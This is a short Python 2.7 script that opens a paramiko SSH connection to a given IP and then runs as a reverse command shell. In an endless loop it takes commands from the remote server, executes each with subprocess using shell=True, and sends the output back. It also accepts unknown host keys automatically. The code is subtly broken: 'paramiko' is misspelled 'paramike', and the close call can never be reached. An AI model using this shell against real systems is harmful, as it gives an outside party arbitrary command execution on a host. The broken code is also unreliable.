#!/usr/bin/python2.7

import threading
import subprocess
import paramiko


def ssh_command(ip, user, passwd, command):
    client = paramike.SSHClient()
    ## client can also support using key files
    #client.load_host_keys('/home/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024) # read banner
        while True:
            command = ssh_session.recv(1024) # get the command from the SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception,e:
                ssh_session.send(str(e))
        client.close()
    return
